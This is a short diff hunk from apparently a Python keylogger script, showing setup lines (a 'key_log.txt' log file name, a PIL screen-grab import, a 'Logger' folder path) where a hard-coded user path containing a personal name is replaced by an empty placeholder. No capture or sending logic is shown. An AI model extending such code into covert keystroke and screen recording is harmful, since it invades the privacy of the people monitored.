@@ -29,7 +29,7 @@ from PIL import ImageGrab
 
 keys_information = "key_log.txt"
 
-file_path = 'C:\\Users\\Christian Yehle\\Documents\\Logger'
+file_path = '' #filePath
 extend = "\\"
 
 count = 0
